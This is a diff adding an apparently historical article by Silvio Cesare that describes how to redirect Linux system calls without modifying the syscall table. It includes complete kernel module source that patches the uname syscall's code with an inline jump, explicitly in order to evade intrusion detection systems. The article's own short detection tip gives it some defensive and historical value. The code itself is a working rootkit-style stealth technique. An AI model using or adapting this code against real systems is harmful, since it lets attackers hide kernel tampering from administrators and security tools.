@@ -1,0 +1,91 @@
+SYSCALL REDIRECTION WITHOUT MODIFYING THE SYSCALL TABLE.
+
+	- Silvio Cesare <silvio@big.net.au>
+
+This article describes a technique of redirecting system calls without
+modifying the sys call table (implemented in Linux).  This can be used to evade
+intrusion detection systems that use the sys call table to register redirected
+or trojaned system calls.  It is however an easy modifcation to make to detect
+the attack implemented in this article. The basic premise behind this attack is
+to modify the old system call code to jump to the new system call, thus control
+is transferred to the replacement system call and the sys call table is left
+untouched.  If this is the only procedure carried out, the old system call is
+left in a clobbered state, and is dangerous to execute, so the original code is
+saved and when the system call is made.  The original code replaces the jump
+and the system call acts as normal.  After this, the jump can then be inserted
+(overwritten) again waiting for the next use.  Detecting this attack means
+that the first few bytes of the original system calls should be saved and then
+compared to verify that indeed the original system call is in place.
+
+
+-- stealth_syscall.c (Linux 2.0.35)
+
+#include <linux/config.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/utsname.h>
+#include <linux/string.h>
+#include <asm/string.h>
+#include <asm/unistd.h>
+
+#define SYSCALL_NR __NR_uname
+
+static char syscall_code[7];
+static char new_syscall_code[7] =
+	"\xbd\x00\x00\x00\x00"	/*	movl   $0,%ebp	*/
+	"\xff\xe5"		/*	jmp    *%ebp	*/
+;
+
+extern void *sys_call_table[];
+
+void *_memcpy(void *dest, const void *src, int size)
+{
+	const char *p = src;
+	char *q = dest;
+	int i;
+
+	for (i = 0; i < size; i++) *q++ = *p++;
+
+	return dest;
+}
+
+/*
+	uname
+*/
+
+int new_syscall(struct new_utsname *buf)
+{
+	printk(KERN_INFO "UNAME - Silvio Cesare\n");
+	_memcpy(
+		sys_call_table[SYSCALL_NR], syscall_code,
+		sizeof(syscall_code)
+	);
+	((int (*)(struct new_utsname *))sys_call_table[SYSCALL_NR])(buf);
+	_memcpy(
+		sys_call_table[SYSCALL_NR], new_syscall_code,
+		sizeof(syscall_code)
+	);
+}
+
+int init_module(void)
+{
+	*(long *)&new_syscall_code[1] = (long)new_syscall;
+	_memcpy(
+		syscall_code, sys_call_table[SYSCALL_NR],
+		sizeof(syscall_code)
+	);
+	_memcpy(
+		sys_call_table[SYSCALL_NR], new_syscall_code,
+		sizeof(syscall_code)
+	);
+	return 0;
+}
+
+void cleanup_module(void)
+{
+	_memcpy(
+		sys_call_table[SYSCALL_NR], syscall_code,
+		sizeof(syscall_code)
+	);
+}
